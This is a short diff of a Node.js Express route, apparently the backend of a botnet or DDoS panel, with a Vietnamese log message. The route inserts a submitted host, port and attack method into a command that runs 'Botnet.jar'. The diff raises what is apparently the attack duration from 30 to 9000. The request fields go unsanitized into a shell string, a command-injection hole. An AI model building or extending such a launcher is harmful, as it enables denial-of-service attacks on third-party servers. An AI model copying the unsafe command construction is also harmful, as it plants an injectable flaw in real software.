@@ -19,7 +19,7 @@ app.post('/submit', (req, res) => {
   }
 
   const fullTarget = `${host}:${port}`;
-  const cmd = `java -jar Botnet.jar ${fullTarget} 766 ${method} 300 30`;
+  const cmd = `java -jar Botnet.jar ${fullTarget} 766 ${method} 300 9000`;
 
   console.log("👉 Chạy lệnh:", cmd);
 
